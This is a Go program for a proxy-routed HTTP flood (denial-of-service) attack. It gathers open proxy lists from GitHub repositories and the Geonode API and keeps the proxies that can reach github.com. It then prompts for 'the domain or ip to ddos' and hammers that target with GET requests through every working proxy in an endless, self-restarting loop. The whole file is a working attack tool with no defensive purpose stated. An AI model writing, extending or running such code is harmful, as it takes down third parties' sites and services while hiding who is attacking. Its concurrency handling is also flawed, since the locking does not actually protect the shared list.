package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var statusCodeToEscape = []string{
	"503 Too many open connections",
	"401 Unauthorized",
	"409 Conflict",
	"404 Not Found",
	"502 Bad Gateway",
	"504 Gateway Timeout",
	"407 Proxy Authentication Required",
	"400 Bad Request",
	"502 Proxy Error",
	"403 Forbidden",
	"503 Service Unavailable",
	"504 DNS Name Not Found",
	"407 Unauthorized",
	"405 Method Not Allowed",
}

func getProxyList_github() []string {
	//get the list of proxy at https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt
	//format of the list is ip:port
	//return a list of proxy
	resp, err := http.Get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

func getProxyList_github2() []string {
	//get the list of proxy at https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt
	//format of the list is ip:port
	//return a list of proxy
	resp, err := http.Get("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

func getProxyList_github3() []string {
	//get the list of proxy at https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt
	//format of the list is ip:port
	//return a list of proxy
	resp, err := http.Get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

type Proxy_genode struct {
	Data []struct {
		ID                 string      `json:"_id"`
		IP                 string      `json:"ip"`
		AnonymityLevel     string      `json:"anonymityLevel"`
		Asn                string      `json:"asn"`
		City               string      `json:"city"`
		Country            string      `json:"country"`
		CreatedAt          time.Time   `json:"created_at"`
		Google             bool        `json:"google"`
		Isp                string      `json:"isp"`
		LastChecked        int         `json:"lastChecked"`
		Latency            float32     `json:"latency"`
		Org                string      `json:"org"`
		Port               string      `json:"port"`
		Protocols          []string    `json:"protocols"`
		Region             interface{} `json:"region"`
		ResponseTime       int         `json:"responseTime"`
		Speed              int         `json:"speed"`
		UpdatedAt          time.Time   `json:"updated_at"`
		WorkingPercent     interface{} `json:"workingPercent"`
		UpTime             float64     `json:"upTime"`
		UpTimeSuccessCount int         `json:"upTimeSuccessCount"`
		UpTimeTryCount     int         `json:"upTimeTryCount"`
	} `json:"data"`
	Total int `json:"total"`
	Page  int `json:"page"`
	Limit int `json:"limit"`
}

func getProxyList_genode() []string {
	// get the list of proxy at https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&filterUpTime=80&protocols=http%2Chttps&anonymityLevel=elite
	// return a list of proxy
	var proxy_list []string
	resp, err := http.Get("https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps&anonymityLevel=elite&anonymityLevel=anonymous")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	var proxy_genode Proxy_genode
	err = json.Unmarshal(body, &proxy_genode)
	if err != nil {
		log.Fatal(err)
	}
	for _, proxy := range proxy_genode.Data {
		proxy_list = append(proxy_list, proxy.IP+":"+proxy.Port)
	}
	return proxy_list
}

func chunkSlice(s []string, total_to_divided int) [][]string {
	var divided [][]string
	var chunk = float32(len(s) / total_to_divided)
	var start, end = 0, 0
	for i := 0; i < total_to_divided; i++ {
		end = start + int(chunk)
		if end > len(s) {
			end = len(s)
		}
		divided = append(divided, s[start:end])
		start = end
	}
	return divided
}

func stringInSlice(a string, list []string) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func handlerProxy(domain, proxy string) string {
	//just connect to the website and check the status code
	//use proxy to connect
	//format of proxy is ip:port
	//format of domain is domain.com
	proxyUrl, err := url.Parse("http://" + proxy)
	if err != nil {
		return "error"
	}
	//create a new http client
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyUrl),
		}}
	//set http client like a mozilla browser
	//client timeout after 1 second
	client.Timeout = time.Second * 5
	//connect to the website
	resp, err := client.Get("http://" + domain)
	if err != nil {
		return "error"
	}
	defer resp.Body.Close()
	//if resp is 503 too many connection
	// make [][]string statusCodeToEscape
	if stringInSlice(resp.Status, statusCodeToEscape) {
		return "error"
	}
	if resp.StatusCode != 0 {
		//fmt.Println(resp.Status)
		return resp.Status
	} else {
		return "error"
	}
}

func removeDuplicates(elements []string) []string {
	// Use map to record duplicates as we find them.
	encountered := map[string]bool{}
	result := []string{}

	for v := range elements {
		if encountered[elements[v]] == true {
			// Do not add duplicate.
		} else {
			// Record this element as an encountered element.
			encountered[elements[v]] = true
			// Append to result slice.
			result = append(result, elements[v])
		}
	}
	// Return the new slice.
	return result
}

func add_good_proxy(proxy string, good_proxy []string) []string {
	var mutex = &sync.Mutex{}
	mutex.Lock()
	good_proxy = append(good_proxy, proxy)
	mutex.Unlock()
	return good_proxy
}

func check_host_up(domain string) bool {
	//check if the host is up
	_, err := net.LookupHost(domain)
	if err != nil {
		return false
	}
	return true
}

func test_proxy() []string {
	var good_proxy []string
	//get the list of proxy
	proxy_list := getProxyList_genode()
	proxy_list = append(proxy_list, getProxyList_github()...)
	proxy_list = append(proxy_list, getProxyList_github2()...)
	proxy_list = append(proxy_list, getProxyList_github3()...)
	//remove duplicate
	proxy_list = removeDuplicates(proxy_list)
	fmt.Println("Total proxy : ", len(proxy_list))
	threads := 500
	//chunk the list of proxy
	proxy_list_chunk := chunkSlice(proxy_list, threads)
	domain := "github.com"
	wg2 := sync.WaitGroup{}
	fmt.Println("Checking proxy...")
	for _, proxy := range proxy_list_chunk {
		wg2.Add(1)
		go func(proxy []string) {
			defer wg2.Done()
			for _, p := range proxy {
				result := handlerProxy(domain, p)
				//if more than 5 seconde, the proxy is not good
				if result == "200 OK" || result == "200" {
					good_proxy = add_good_proxy(p, good_proxy)
				}
			}
		}(proxy)
	}
	wg2.Wait()

	return good_proxy
}

func main() {
	//get the list of proxy
	proxy_list := test_proxy()
	fmt.Println("Total proxy :", len(proxy_list))
	//ask for the domain or ip to ddos
	fmt.Println("Enter the domain or ip to ddos")
	var domain string
	fmt.Scanln(&domain)
	if !check_host_up(domain) {
		fmt.Println("The domain or ip is not up")
		os.Exit(1)
	}
	//ask for the number of threads
	fmt.Println("Enter the number of threads (max are number of proxy : ", len(proxy_list), ")")
	var threads int
	fmt.Scanln(&threads)
	if threads > len(proxy_list) || threads < 1 {
		threads = len(proxy_list)
		fmt.Println("Apply max threads")
	}
	//chunk the proxy list
	chunked_proxy_list := chunkSlice(proxy_list, threads)
	//start the threads
	//create a channel list of good proxy
	for {
		var wg sync.WaitGroup
		for _, chunk := range chunked_proxy_list {
			wg.Add(1)
			go func(chunk []string) {
				defer wg.Done()
				for _, proxy := range chunk {
					for {
						//time.Sleep(time.Millisecond * 100)
						status := handlerProxy(domain, proxy)
						if status != "error" {
							fmt.Println(status)
							continue
						} else {
							break
						}

					}
					fmt.Println("Thread died")
					return
				}
			}(chunk)
		}
		wg.Wait()
		fmt.Println("All threads are dead, restarting")
	}
}
